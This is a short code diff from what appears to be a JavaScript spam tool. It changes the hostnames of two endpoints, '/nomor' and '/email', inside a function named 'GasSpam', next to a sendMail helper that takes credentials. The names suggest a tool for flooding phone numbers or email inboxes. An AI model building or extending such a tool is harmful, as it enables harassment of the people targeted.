@@ -67,9 +67,9 @@ const sendMail = (email, user, pass)=>{
 
 const GasSpam = (email)=>{
   u = [{
-    url:'https://vast-eel-trousers.cyclic.app/nomor',
+    url:'https://real-cyan-horse-toga.cyclic.app/nomor',
   },{
-    url:'https://vast-eel-trousers.cyclic.app/email'
+    url:'https://real-cyan-horse-toga.cyclic.app/email'
   }]
   
   
